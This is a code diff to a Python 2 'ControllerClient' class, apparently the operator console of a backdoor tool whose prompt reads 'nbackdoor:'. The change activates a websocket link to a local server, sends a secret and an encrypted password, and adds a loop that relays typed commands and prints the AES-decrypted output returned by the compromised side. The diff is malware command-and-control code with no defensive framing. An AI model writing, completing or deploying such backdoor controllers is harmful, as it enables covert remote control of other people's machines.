@@ -28,25 +28,24 @@ class ControllerClient:
     def run(self):
         while True:
             try:
-                # print 'finding server...'
-                # self.ws = create_connection("ws://localhost:8888/")
-                # print 'server connected.'
-                #
-                # sercret_msg = {'id': self.ID, 'secret': b64encode(self.SECRET)}
-                # self.ws.send(json.dumps(sercret_msg))
-                #
-                # time.sleep(1)
+                print 'finding server...'
+                self.ws = create_connection("ws://localhost:8888/")
+                print 'server connected.'
+
+                pwd = raw_input('please input the password:')
+                sercret_msg = {'id': self.ID, 'secret': b64encode(self.SECRET), 'pwd': self.encrypt(pwd)}
+                self.ws.send(json.dumps(sercret_msg))
 
                 while True:
                     input_str = raw_input('nbackdoor:')
-                    msg = self.command_to_msg(input_str)
+                    self.ws.send(self.command_to_msg(input_str))
 
-                    # msg = json.loads(self.ws.recv())
-                    # if 'data' in msg:
-                    #     data = self.decrypt(msg['data'])
-                    #     print data
+                    msg = json.loads(self.ws.recv())
+                    if 'data' in msg:
+                        data = self.decrypt(msg['data'])
+                        print data
 
-                # self.ws.close()
+                self.ws.close()
 
             except Exception as e:
                 if self.ws:
@@ -79,10 +78,6 @@ class ControllerClient:
             exit()
 
         return json.dumps({'data': self.encrypt('data')})
-
-    def send_msg(self, data):
-        msg = {'data': self.encrypt(data)}
-        self.ws.send(json.dumps(msg))
 
     def encrypt(self, text):
         encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
